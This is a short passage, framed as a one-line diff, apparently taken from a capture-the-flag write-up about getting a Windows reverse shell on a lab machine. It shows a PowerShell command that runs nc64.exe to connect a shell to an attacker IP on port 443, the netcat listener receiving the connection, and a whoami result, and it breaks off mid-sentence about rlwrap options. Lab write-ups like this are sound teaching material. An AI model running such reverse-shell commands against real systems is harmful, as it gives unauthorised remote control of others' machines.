@@ -1,0 +1,1 @@
+powershell -c \programdata\nc64.exe -e powershell 10.10.14.6 443 : oxdf@hacky$ rlwrap -cAr nc -lnvp 443 Listening on 0.0.0.0 443 Connection received on 10.10.11.115 54865 PS C:\Nuxeo> whoami hancliffe\svc_account I’ve long been a fan of rlwrap for improving Windows reverse shells. -c adds tab completion, -A makes it color aware, and -r
